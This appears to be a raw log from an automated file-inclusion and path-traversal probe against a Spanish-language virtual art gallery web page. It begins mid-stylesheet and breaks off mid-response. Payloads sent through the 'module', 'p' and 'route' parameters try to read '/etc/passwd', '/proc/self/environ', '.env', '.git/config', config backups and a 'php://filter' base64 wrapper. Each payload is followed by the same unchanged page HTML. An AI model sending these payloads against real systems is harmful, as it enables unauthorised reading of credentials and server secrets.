            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] module=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
-- Testing parameter: p
[payload] p=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] p=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] p=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] p=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] p=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] p=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] p=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] p=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
-- Testing parameter: route
[payload] route=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
